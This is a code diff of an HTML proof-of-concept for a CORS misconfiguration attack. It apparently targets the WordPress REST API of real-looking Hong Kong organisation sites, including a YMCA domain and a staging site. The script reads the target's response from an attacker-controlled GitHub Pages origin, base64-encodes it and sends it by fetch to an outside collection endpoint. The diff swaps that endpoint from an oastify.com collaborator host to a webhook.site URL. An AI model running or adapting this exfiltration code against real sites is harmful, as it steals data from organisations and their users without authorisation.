@@ -11,16 +11,16 @@
 </head>
 <body>
     <h1>CORS PoC - Debug Mode</h1>
-    <p>Target: https://thebeacon.ymcahk.org.hk/wp-json/</p>
+    <p>Target: https://target.com/wp-json/</p>
 
     <button onclick="runTest()">🚀 Run CORS Test</button>
 
     <pre id="output">Click the button...</pre>
 
     <script>
-    const target = "https://target.org.hk/wp-json/";
+    const target = "https://staging.ppdh.org.hk/wp-json";
     const attackerOrigin = "https://kelvinshingp15.github.io/";   // Your GitHub Pages origin
-    const collab = "8dms12b9dmuxdkev5oahheadg4mva0yp.oastify.com"; // ← CHANGE THIS
+    const collab = "https://webhook.site/d6636009-1230-412e-a077-25ed8faad3f7"; // ← CHANGE THIS
 
     function runTest() {
         const output = document.getElementById("output");
@@ -42,7 +42,7 @@
         })
         .then(data => {
             output.textContent += "[+] Data received!\nExfiltrating to Collaborator...\n";
-            const exfilUrl = `https://${collab}/?debug_exfil=` + encodeURIComponent(btoa(data));
+            const exfilUrl = `${collab}/?debug_exfil=` + encodeURIComponent(btoa(data));
             fetch(exfilUrl, { mode: "no-cors" });
         })
         .catch(err => {
